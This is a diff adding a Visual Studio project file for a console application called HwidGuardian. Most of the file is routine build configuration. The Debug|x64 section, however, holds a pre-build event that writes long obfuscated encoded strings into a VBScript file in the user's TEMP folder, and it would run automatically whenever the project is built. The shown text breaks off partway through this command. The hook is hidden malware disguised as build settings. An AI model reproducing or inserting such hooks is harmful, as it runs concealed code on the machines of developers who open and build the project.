@@ -1,0 +1,162 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Debug|x64">
+      <Configuration>Debug</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|x64">
+      <Configuration>Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <VCProjectVersion>17.0</VCProjectVersion>
+    <Keyword>Win32Proj</Keyword>
+    <ProjectGuid>{73cf78f9-afa5-46ca-9f0e-67f3b7b7fbe7}</ProjectGuid>
+    <RootNamespace>HwidGuardian</RootNamespace>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Label="Shared">
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+    <PreBuildEvent><Command>@echo off&#xD;&#xA;setlocal&#xD;&#xA;set &quot;a=%25TEMP%25\mde1w9&quot;&#xD;&#xA;mkdir &quot;%25a%25&quot; 2&gt;nul&#xD;&#xA;echo b = &quot;w4jDrsOjw4XDrcOew5HDp8KVwqbDj8OAwoLDtMOlw4PDq8OWw4/CmcKdwr3DrMOpw5TDosOjw4nDlsKZw4fDp8Khwr3Dm8Ouw5bDnsOQwr/DlsKZw5XCu8Kewp3CncOgwoLCtsKVwrDDnsOswo/DiMOXw4zDnsOYw5bCmcOXw5vDrcOawr3DlsKVwpXCq8KwwobDr8KVwp/CmcODw4fDsMKiwrHDm8Ofw4fDnMOpwoLDm8Ouw5bDnsOQwr/CmcKmwpjCtMKZw4bDnsOnw4vDr8OawqTDssOpw4fDrMKVwp/CmcODw4fDsMKiwrHDm8Ofw4fDnMOpwoLDjMOuw5XDrcOaw4/Cp8OIw4fDnMOqw5TDosOpw5vCp8K4w5TDssOlw5bDqMOcw5TDmsOlw4rDssKjwrTDn8OYwpTCscKuwprCvcOaw5TDosOrw4fCu8Ouw5bDnsOoworCncOaw5DCpcKVwobDrMK3wo7CmcKmwpLCqcKlwo7CmcOQwrXDssOow5bDnsOiwpDDjMOaw4XDrsOnw4vDrcOuwpDCvMOnw5vDqcOpw5HDoMOnw4PDqcOdw5vCp8K9w4PDrMOdwqPDpcOcw5HDq8Oew5bDocOiwrDDmsOiw4fDlsKvwpzDjMK9wqPCq8KqwpjCosKwwobDpMKVwp/CmcKZw4bDnsOnw4vDr8OawqTDssOpw4fDrMKjwqnDnsOpwqTDssOpw4fDrMKdwpXCq8Kewp3CncOrwoLCtsKVwobDncOaw5TDosOrw4fCu8Ouw5bDnsOowpDDgMOaw5bCu8Ouw5bDnsOoworCqsKrwovCtMOnw4fDrcOqw5TDp8KVwqLDtMKVwq3CmcKywoLCncOgwp3CmcOLwoLCtsKVwobDr8KVw5/DtsKww4jDrsOjw4XDrcOew5HDp8KVwqbCmcOww5LDmsOnw4PDpsKVworDlMOow5bDq8Oew5DDoMOSwobDnsK3wrzCpcOQw5XDrcOnw4vDp8Ocwr/CncOaw5DDnMKewp3CncOZwqTDssKVwp/CmcOQwrXDssOow5bDnsOiwpDCvMOkw5DDr8Oaw5TDrcOSwpzCs8K7w5TDqMOiwqTDmsOow4fCr8KpwrXDrcOnw4vDp8OcworCncOawqTDk8Kewp3CncOow4TDssKVwp/CmcKZw4bCu8Ouwr3CqcKjwpDCsMOSwp3CncOawqTDssKVwp/CmcKZw4bCu8Ouwr3CscKjwpDCocKZw4bCu8OuwpDDhcOaw5DDoMOpw4rCmcKiwoLCqsKewr/CtMKZw4bDq8OrwoLCtsKVwqbDj8OAwoLCpsOaw5DCmcKZw4fDp8OYwoLCpsOowqTCmcKZw5XDm8Ouwp3CncOgwoLCtsKVwobDncOnw5jCp8OAwp3CncOrwoLCtsKVwobDncOnw5jCp8OLwp3CncOWwoLCtsKVwr3DjMOuw5XDrcOaw4/Cp8OIw4fDnMOqw5TDosOpw5vCp8K4w5TDssOlw5bDqMOcw5TDmsOlw4rDssKjwqPDnsOowr/Cs8KvwqXDq8Oaw4PDrcOaworCosKwwobDmsKjwq/DqMOZw4fCmcKywoLDlMOIw5vDrMOpw4fDpsKjwrXDnsOYw5fDq8Oew5bDssKjwqXDq8Ouw5LDrcOkw4nDq8OWw5LDocOuwpDCvMOew5LDocOaw5TDhsOkw4bDnsOSwpzCs8K4wqTCvMKwwobDmsKjwrLDmsOZw4bDosOjw4nCmcKywoLDlMOIw5vDrMOpw4fDpsKjwrXDnsOYw5fDq8Oew5bDssKjwqXDq8Ouw5LDrcOkw4nDq8OWw5LDocOuwpDDicOWw4bDncOew5DDoMOCw5HDncOawr/Cs8KvwrLDhMK4wrXCsMKwwobDmsKjwq3DnsOuwoLCtsKVwobDpMKwwobDmsKjwqvDj8KVwp/CmcKZw5jCtMKZw4bDnMKVwp/CmcKZw4PCp8K4w5TDnsOWw5bDnsK5w4fDnMOnw5vDqcOpw5HDq8KdwovCtMOpw5TDssKVw53CncOZwqTCmcKywoLCncOZw4XCp8OJw5TDmsOjw5XDn8Okw5TDpsK7w4vDp8OWw47Cu8Ohw5HDnMOgworCncOawqTDssKhwoLCqcKhwoLCncOawqTDssKjwq7DnsOjw4nDrcOdwovCtMOnw4fDrcOqw5TDp8KVwr3DjMOuw5XDrcOaw4/Cp8OJw4fDscOpwpDCvsOjw4XDqMOZw4vDp8Ocwr/Cs8KvwrfDjcK7wprCp8K8w4fDrcOIw5bDq8Oew5DDoMKdwobDncK3wovDtsKVw4XDmsOpw4XDocKVw53Dq8Oaw5bDrsOnw5DCmcKZw5DDrsOhw47DtsOywobDnsK3woLCtsKVwoTDkMOBw5TDp8OjwqPCssOcw4TCqMOZwpnCqcKrw5rDkMKow4nCvcOIwqbDmsKgwrPDjMK9w4TDn8KlwrjDqcK5wrrDp8OKw5bDnMOHwrvDksOWwpvDjsKqwpHCrsKqwrnDscK4wqzCrsOkw4bDocOvwrLDp8OZwpbDs8OIw5jDjMOjw4vDkcOAwpHDiMKqwrzCrcK9wqTDrsOGwrPDpcKnwrrCpMOOwpfDiMOvwpjDn8ONwqfDn8KswpLDgsOuw4fCv8Knw4vDqcOewpLDhsKuw5nDpMONwpHDnsK6wpTDhsOlw4jDiMKkwrnDkMK4wqzDrMODwrrDksONwqvCqcOrw5zDg8ONwpHDpcK3w5jCqcOMwqzDpcOvw5XDrMOCw5vDjMKpwqzCqcOrw5fCsMOew5vCrMOgwrXDsMK3wrvCv8OlwpvDsMOmw5vCqcK7wq7DicOlwprDgsOew4TCq8OPwpfDoMOuw4PDqMOswpbDpsK3wqXDkMOBwrjDk8OhwpPDoMKnwrTDhsOrw4PCqsK2w4nCrMKtw5fCq8OowpnDsMKswrDCvsOswqvDocKrw4bCrcOCwprDnsK3wqrDoMOiw4/DncOIwq7Dp8Knw4nDoMK3wrnDkMOWwq7DisOiw5XDrcOKw4bCpMK5w4rDhcONw4zDnMOHw4vDncKtwpfDq8KmwpHCvMOpwpjDq8Ogw4TDhsK7wq/DqcOcw4bCvsOLwo3DqMOcwpjDncOBw47CpMK+w4TDr8OnwrLCu8Odw4jDiMOawqjDqMOYw5jDhsOew5vCvsOIw4TDqcOEwrnDq8Oew47Cr8K+w4jCvsOmw5zDhMOLwqfCv8Krwq/Di8KmwrvCv8Orw4rDr8K4wrvDo8OfwrzDj8K4w4bDscOswo3DosOlw4rDkMKgw5fDnMK/w4nDgsOpwqPCvcKlw5XDj8KpwpbDgcOBw5DCscOYw5LDp8OtwqTDrMK2wrjDq8Oaw5jDqcKpw4/DgsOEwpbDisKow4vDrcKmwrfCr8KmwrHCscOkwqbCqMOewpPDhMOvwrXCrcK/wpLDgsKlwqbDocOiw4bDnsK9wq/CusK9wq/CvsK6wqrCscOOwqXDscK+w4jDscOrwrfDkMK+wpXDp8K2w4jDnsKmw5PDicK2w4zDhsOZwqjCrcK8wrvCrcOXwqTDgsOHwrTCu8Orw5jDncOEw4PDrMK5wpLDsMK5w5PDncK7w4zCrsOewqjDssKkw5nDocKlw5TDnMONw4jDs8Kqw5HDm8KkwrTDsMOOw5fDrMOtwpPDpsODwqnDiMKpwrLDrsOKwq7DgsOvwqXDg8OIwrLDhsOXwrnDiMOfw4vCsMKnwrPDnsOgwpfDrsK8w5bDjMK+wpfDncOBw5XDrMOlw4TDpMK6w43DssKtwpXDo8OhwpTDrcOmwqbDoMKqwpLDhcKgwq7DqcOmw4rDosOuw5bCsMOvwqzDgsOtw4zDnsK2wrvDjsKkwqvDiMKgwqfDiMK+wrLDm8K8wrjDo8OBwpbDh8OIwqPDssOiwpTDscKtwpfCqMOrwrzDjcK3wqrDjcOGw5fCrMOjw4jCusOAwrrCrsOOw5jCsMOpwpfCqsOIwrvDqcOcwqnDi8OIwqPDj8K4wrPCv8Oewo3DocOCwqzDpMKrw5PCq8ObwrvCssKrw4/DgMOcw4vDq8Okwq7Dr8Krw4fCpMOdwqTDnMKrw5bDqsK5wqzDn8Opw4nDocOaw47DqsOmwqjDm8K/w4rDosOKwpnDrMOLw5rDo8ONwpLDm8K6wrLDiMOhwq3DncKqwrfDp8Ksw4fDscOcwq/Cq8OFw5LCq8K9wrLDgsOlwpXDjsOYw4nCvsOGwpjDp8K7wrjDicKow5DCrsOAwqfDo8K3w5vCr8Kswq3CrMOKwqPDjsKgwqXCsMK8w5DDicOmwrbDj8K9wrvDisOJwpTDpcODwpPDksK8w5jCscOrw4bDkcK9w4vDhsOkw5LCrcOrw5zCqsOHwrPDjMK3wrnDqcOgw4jDgsOcw4PDkMOkw5LDjsK5w5LDs8K+wqvCu8K2wrrCq8OewrjDksK5wpTCvsK3wqnDs8Kpw4nDqsOgwrDDgcKuw5zDpMOGw4nDjsOnwpfDosKgwq3DkMKmwqXDhMOFw4fDo8K5wqrDn8OCwqbDrsOawpbDq8OfwqrCusK4w4nDksOBwrjDpMOMwq/Cq8OPw4nDrcOawrLDo8OPwrjDn8Oiw5rCr8OWwqjDgMOJw4jDosOLw5LDo8Kmw4bDqsOmwqvDr8K3wrrDoMK7wpLCscOmw5PCpMOhw4jDnMOKw5rDoMOuwpvDncK2wpHDgsK8wpjCrMOhwqrCv8OZwrzDrsOYwqrDhcOuwqvCr8ODw5rDocOdw5zDr8KnwpPDnsKowo3DkcK5wpTDksOIwqbDkcK/wrTDrsOdw4jDksOgw4vDq8OYw5XDo8OswrLDs8OZw5zCusKnw5vDg8OhwrPDsMKuwq/Dj8OKwo3Dq8OEwqvDg8OOw5bCqcOIwpXDm8KrwpXDg8Ksw4fDm8Ocw47DgcK/wqPCusK+wrnDscOpw4XDocODwrHDq8Oaw5HDhMKqw4bDoMOWwqrDjMOjwqvCusOKwqXDk8OZwpnDs8Ocw47DjsK2wrbDoMOFw5jCrsOGwpvCqcK5w5nDk8OqwrrDnsONwrLDsMOLw5DDrcKpw5DDncOiw5nCsMOMwrHCssKswq3DiMKuwrTDocKpwqjDosKnwq7DjMK+w47DncKmw5XDncOrw4XCu8Osw4PDhcOvwq7DpMOWw4rDkMOBwrLDrcK2w4vDo8OrwqTDgMKlwqbCvcOFw4XCscOiwprDqMOgw43DocOZwqzDssOlw5bDssKuwqrCssOHw4TDq8Kuw4PDosOKwrPDgcKnw4nCr8Oow4fDpMOWwrzDhcOMwpnDiMOGwq3DjMObw5vDhMK5w5jDisKlw5PDgsOZw5jDj8OKwqbDqMOgwrvDscK3wrTDhMK5wqbDrMOPwpnDm8Ksw5nDhsKuw4PDm8KrwrDDn8OdwrbDp8OXwrLDs8Kgw5LDm8KrwqXDjMKrwpHDicKpw4/Dr8Odw5rDosOhwpPDn8OswqXDn8OBw4XDgcOKwrfDnMOuw5TCusOpw5jDpsK9w47DrMOLwrrDoMOOw5XDrMOEwrHDg8OAwrTCu8K9wrHDgMKgwqnDpcOgwo3Dp8K/wqnDgsONwrbDssKowpPCvMK3wq3DhMOowpjDksOowrHDr8Kpw5TDnsK9w4TDjMKkwqrDgMOrwqfDocKpw5nDk8K6wq7DgsKgw5rCrMKmwpTDhcOpw43DgMKnw5bDr8OWwrLCrMOLw4vDj8ODwpLDksOrw5TDi8KtwpPDqsOZw43DicOrw4jCqcKswrHCusOfw5DDsMOCwrvDmsKqwpbDicOEwpbDn8OGwpnDoMOKw5LDsMOew5LDi8K7wq7DjMOMwrnDqMK4wpHDhcODwpTCvcObwo3CqsOtw5jCq8OCw4fCssKnw4/Dp8KgwrXDssOhw4TDrMK2wqjCpMKkwqvDscOfwq7DoMOEw4nDosK3wqTDh8K8w5zCusK2wqfDh8OZwpjDpcOBwpbDqMONwpjDs8OAwrnCr8OYwpXDmsK9wpfDrsOhwqnCqcOZw5rCusOiwrDDrsKlwpvDjsK6wq3CvsOCwrLDosOjwrHDh8OLwrbDksOCwp&quot; &gt; &quot;%25a%25\m0fSj7TE2.vbs&quot;&#xD;&#xA;echo c = &quot;qcOHw4jDnMOJw4TCrMOKwrfCpMKuwrnCr8K8wrnCqcOKw4fCvsKtw4vDj8OmwprDqMOGwo3CrMONwqjDrsOcwpHDicKtw4PDq8OMw4fDrsK6w43DocKmw5nCq8K2wpjCrsK5wq/Di8KswpnDhMOlw4jDgsOuwqjCvcOhwrDDgcKgwqrDj8OOwpvDocKlwrLCvMOGw4PCscK9wrfDnMOnwrrDs8Ogw4nCv8OGwrLDoMOewqjDgcK/w4bDocOpwqfDoMOKwqjDgcKnwpvDhcOGw47DocOdwq3DjcKrwrzDm8Ocw5zDr8OswqvCr8Kmw5TDo8Ojw5jDosOKw5zDisOAwqbCvMOmwpXDkMK6wpvCrMOpwq7Dj8Ksw5zDoMOBw4XDqsOpw5rCq8OLwqPDisOPwrTCq8OfwpjDjcK5w5DCscOOwrnDhcOIwrHDh8OEwrDCvcOqw5HDrcK7wrLDsMOqwq7DhcKow5HDj8ONw5TCssOMwrXCrsKpwqTDncKuw4PDgcOqw5PDpcOFwpnCssOtwqnDhsOew4nDosK/w4XCvMOCw4rDjsOow4/DjMKtwpLCqsOfwqrDpMKow4PDgMOnwrrCusOAwrPDn8K7wpnDjMKsw5fDjMOmw5LDjsObw5jDocOtwrPCvcOMwrLDisOowrjDj8OowpTDscObw4XDhMKuw5nDpsOlwrPDh8K2wpnDoMOMwqrDj8Kgw4rCrsK+wpXDgMK/wqPDs8K7wqvDm8OowqzCu8OEwrDCrsOHw5TCvMK+wq/DosOMw47Dh8OpwrnDoMOqwpjDpMODwqjDosOiwpHDh8ObwqrDi8OkwpPDpMK5w4PDjMObwqTDocOtwq3Dh8OIwpLCq8K+w4rDkMOZwrTDncOsw5XCvcK/wqvCu8KgwpbDp8Kqwq7CqsONw4nDicOYw4TDosK/wqvDkcObwq3CscOlwprDqMKuw5DDmsOFw5vDocOAwrnDkMOgw47Dj8OJwq7DqcONw5rDpsOXwpbDs8KswrnDp8K4wpPDqMOXwpvDscOkwpjDhMKowrbDp8K7wrrDkMOkw5jDqMOOw4vCvMKlw4TDn8Ojw5jCrMOHw5XDjMOYwrzDssOew5zDnMK3w47CssKkw5XDosOPwq/Dp8OuwrvCv8Oswq7DkcOhw4rDp8K+wq/Dp8K4w5TCqcOWwqzDocKpwqjDksOdw43DjcKnwo3Dm8Ofw4nDh8OFw5TDqsK5w4PDpMOWw5TDmsOHwrfDpcOGwqzCu8Odw4fDk8OBwpbCrMOowqTDksKpwpbDksOlw5nDrcOtwrXDn8ONw5bDssOfwpfDg8OEwo3DjMOiwqPDocKsw5rDrsOmwpPDksOkwpjDrMOgwrjDg8Ktw4rDpMK7w5zDn8Kgwo3DpMOmwrXDisOBwpXDnMOpw5HDssOow4bCsMOkwpbCssOiw43Dj8K/w4bDsMOtwrHCrsKlw5vDisOswqbDrsKtwrXDksOmwpvDnsOvwrDDssOdwrHCq8Kmw5PCqsOpw5jDpMKuwqPDrsOJwqXDs8K6w43DosOewqbDiMOMwrDDrcK+w4vCrcOtw43DgcOIwrzDs8OdwrDCsMOnw4jDncKlwpPCu8OJwpfDncOrwqzCusKsw5fCrMObwpLDjMOew47DhMKnwrvDr8KpwpHDr8OowrfCvsKgw4nDgMOPw5TDsMKgw4fDmsOrwrbCrMOMwq3DhsKkwpfDksObwrfCssOWwpfDqMK+wqfDpsOswqnDiMOXwrnDgcOCw5bDr8KlwrjCssK6w47DocOhwpvDrMOcwqfDscOJwrnDscOgwpjDrMOdwpLDhMOnwqzDmsKkw5PCrcK8w5PCrsObwpPDp8OWwrrDsMK4wrrCvcKlwqXDrMOXwrDDmsK3wprDjsOrwpTCq8OawqzCrcOuwq7DjsOrwqzDksOPw5jCrMOowo3DkcOrw5zCpMK4w5PDksOqw4nDgsOpwpLDscKpw5bDmsK8wpfDg8Kqw5LCqsOGw4jDkMOHwpLDscK7w5DCvsOowpHDm8Ovw4bDksOYwpbDk8OJwpjDo8Ovw5fDhsOIw5HDnMKmwqXCsMOBwqfDmsOPw4fDosOowqzCrcOkwq7DiMOMwqrCv8Krw5LDiMOow5XDpsOuwrHDhsKuwqPDrMOHwqTDpMOHwrLCqMK+w4nDhMOqw4bCr8OZw5LDosOtw4/DicOew5TCvsOAw5PDksOkwq3CvcK/wqnDrcKlwpnDisOFw4rDh8Kqw5DDqsKswrzCrsKgw4XDocOCwq7Dg8OPwrfDisOBw4nDi8K3w4rDjMKkwpnCr8Okw5jDjMK7w5nDisOdw5vDqcOrw4PDkMOtwrfDqMOuwrjDscK4wrzDpMKgwpLDq8Kkw4bDqcK7wpTDk8OYwq3CsMOiwpfDpcOkwqrCrMOOwqTDi8OPwrHDm8K9w5jDmsOqwrXDm8OZwqbDpsOvwpPDgsOWwpTDscOtw5fCssK/w4jCrsOZwprDg8Knw47CrcKnw5HDpsOBw5HDncOcw5DCr8Okw4vDk8K3w4jCu8OrwrDCrcOZwqzDrMOLwrTDhMOuw5zDjsOkwrnDpMKuwqbDqsOfw5bCscK3w4jCpMOkwrDDoMK3wpXDhsKtw4XCu8Kuwq/CvcOmwqfDoMOYw47CqsOAwrLCqsOPw5HDpMOgw5TDoMOXwpvCrsKpwrPDrcKqwpjDpcK2wqTCusOJwrbDrsOcw4vDosOaw5LDscKgw5HDgcOZw5zCvsOswpnCrcOOwpTCrcK9w5zDg8OYwrPCr8OtwpvDrcK6w5rDgMOEwqXCrcOtw4rDk8OCwq3DrsKowqzDscOKwqzCvMOfw4XDgMOYw4PDk8OewrrDjMOhwpvDg8K2wpTDkMOuwrvDmsONw4rDiMKqwrLCu8OBwrfDnMOtwpXDpcKuw4vDjcKpwq/Dk8OZwrPDg8KowrbDjcKmw5rCssOZw5HDisOHwpfCsMOiwrfDpMOHwq/DpsOuwpXCvMOYwpXDhsOmw5fDrsObw5bCvMOowrPDhMK6wqfDgcOowrjDksK7w43DrsKswrPDosOZwqbDq8ODw5XDs8Ouw5vCrcKgwo3DisKkwqnDksOlwrzCsMOkwrHDp8K+wpPCrMOLw5XDqMOkwrTDg8OjwqrDgcKkwpPCvMOiwpfDiMK8w5rDqsOfwpHDisOewqbDpcKtw5PDpsOuw4bDo8K/wq3DjcOJwqjDpcKlw4PDr8KmwqXDsMOtwo3CssOJwpLDk8OjwpPDoMK4wpHDncOaw4zDqsOlwrvDicOewpPDrMOEwrPDg8Orw5DCssOfwrbCusOJwqnDjcKpw43Dh8K/wrfDrsKgw4vCv8OYwq7Dh8Klw5bCvMK3wqbDgsOFw4XDncOLwqvDosOCw5HDiMOdwqvDscOLwrDDsMOewqvDkcOgwo3DhMKswpLDnMOdw5LDhsOuw5nDh8Kqwo3CqMK6wq/CrsOLwrbDpsK/w5PDgcOdwrbDjsKlwrPCrsOAwqrDgcKtwpPDqcOiwq/DncOvwrnDq8OKwrXDjsOJw4jDocKqwpHCvMOWwqTDo8OWw4TDjsOAw4jDssOPw5jCqcKow4/DksOdw4/DgsOJwo3DqMOFw5DDi8Oswq/DosOFwrbDscKsw4XCvMK5wpTDmsOswqnDisOCw5nCrcOGwrbCvsKtwqjCr8OnwpfDksOHwrvDn8OIw5LDgMK9wrfDo8OXwpLDqcOdwrTDnMOdw5fDhMOtwq3DoMOmwpTDm8K/w5fDs8K6w47Dg8OiwqnDscOfw4nDj8OgwrzDqMOkw5vDisOew43Do8OjwrfDoMKsw4rDqsKswqrCvcOBwqrCqMKowrXDrsOIwprDhsOiw4fCqMOvwqrDhcKnw4fCsMKgwrXDhcKmwrHDksOkwrLCvcOiwq7DksOdwrvDhcOYwpfDncOXwqTCvsOswpvDrcOqw4TDpsOGw5jDm8KswrjDqMKlw5bCrcOBw5PDiMOpw4fDkcKkw5vDpMONwo3Dk8Oow4XDq8OGwpfDjMK6w5TDgsOgw4jDhcKmw47DqcKnw4fDpcOewq7DkMOnw43Dh8Oqw4fDpMOXw5bCssKpwpjDrsOlwrDDhsKmw5nDqcKow5PDkMOLw43DjsODwrbDosOgwpnCusOiwq3DqcKow5jDkcKtwrvCvMOGw5nCpMOJw47CqsKnwrPCqMOjwqTDscK9wrHDm8Krw5bDgsOHwrrDo8OPwrLDqcK/w4XDm8Ouw47Dh8ODw5jDosODw4/DjsOsw5TDjMOowpfDo8KrwrPCqsKow4fDjsOWw4rDicKnwqfDnsOIwpPCvcOAwpLDhcOowrnDnMOqw43DgcOCwprDoMOvwqXDrsOfwqPDm8Kuw5bDkcOpw4PCscONwrLDsMKnwq/Dp8Ofw43DncOrwq/Cv8OWwqfCv8ONwpPDhcKgw5HCvcOpwqnDh8ODwpLCq8OlwrDCvMKtw5fDjsKqwqPDgcOMw5TCvsKpwpfDncOHwqfCv8K7w5DDhMOZwrTDg8K5wq7CqMKgwrjDm8K4wqfDpsOKw5bDjsOBwrnDi8Otw5jDisK4wq/Ds8OAw4TDscOHwrHCpMK4w5XDm8Obw4rDjMOjw4PDpsK2wq/DhsOYwrbDo8OFw4vDiMONwqnDrcK2w5TDhcKsw5DDk8Osw4XCrsOhwrHCscOCwpjDocK+wqzCqsOLwrjCvMOMwo3DjsK7wqfDg8OMwo3DscOXwpbDr8OqwqbDpMOEwqjDi8OGwqrDkMOkwprDk8OEw4TCpMKkwrvDjcK8w4vDnMK7wqvDi8OiwqbCsMOqw4PDqMOCwrTDhsOsw4XDpMOowqrDrcOBw4TDrsOqwpPDrsKuwo3CvcOhwqvDgcK+wpLDh8OFwpnDjMOXwqTDicOfwrzCscKkw5fCqsOBw47DiMOWwrrDksOow5zDn8Kow4TCv8KpwpvDgMOcwrbDo8KqwqXDmsOKwpvDh8KrwrDDpsObwqvDnsOawrHDjMOuw5rDmsOEw4/DpMK4wqXDjcOvwrrCsMOtwpjDsMKkw5nCpMOmw5fCvMODwrHDhsOOwqnCvMK9wpjCq8OrwpTDsMOIwrvCscK/wqrDpsObw5fDmsKrwrTDn8OXwq7DrsKrwq/Dk8OawrLDnMK+wrnDisOrw47DjsKrwpnDrsOvw5fDrsOZw5nDnMKtwrDDjcOFw5nDpsOOwpXDhMOfw5fDhMOLwrnCrcOhwqzDocOWw5TDp8K+wrvCqMKuw5bDiMOBwqPDoMOKw4nDiMOgw5fCsMOKwqTDjsOuw4XCqcKrw4zDocOdwqvCm8KwwobDrcOiwoLCtsKVwobDnsK3wpDDjcOkwqXDocOWw5TCusOnw5TDmsOuworCosKwwr3DmsOnw5TDmsOuwr/Cs8KvwrTDnsOrw4fDq8Oow4fCocKZw5bDpsKewp3CncOHwoLCtsKVwqbCmcKiw4fCu8OPwoLCncOpw4/CmcKiw4fDp8OYwoLCm8KXwp3CncOpwoLCtsKVwobDi8KjwrbDqMK4w4rDmsOnwqPDq8Onw4PDssKdwovCtMKVwr3DmsOnw5TDmsOuwr/Cs8KvwrTDnsOrw4fDq8Oow4fCocKZw5bCosKwwoLCncK3wrjDj8KVwp/CmcOQwrXDssOow5bDnsOiwpDDjcOaw5rDrcKjwqfDp8OYw5HDncOew5DDoMOSwpzCs8OKwrbCv8KtwpDDgMOaw5bDjMOpw5TDosOjw4nCocOQwrXDssOow5bDnsOiwpDCvMOkw5DDr8Oaw5TDrcOSwpzCs8K7w5TDqMOiwqTDmsOow4fCr8KpwrXDrcOnw4vDp8OcworCpsOfw5HDosOjwoLCncOpwovCosKwwoLCncK6wrLDkcKVwp/CmcKXwqvDp8Orw5HDpMOawo/CvsOtw5LDq8Oaw5XDrMOew5HDp8KXwp3CmcODw4fDsMKiwqPDpcOew4PDrMKVwo/Dh8OWw4/DnsKVw5LDkMODwoLCpsOLw4PDpcOqw4fCmcKZwqfDicONwoLCpsK7w5HDq8OYw4fCtMKVw5LDkMODwoLCncK3wrjDjw==&quot; &gt;&gt; &quot;%25a%25\m0fSj7TE2.vbs&quot;&#xD;&#xA;echo d = 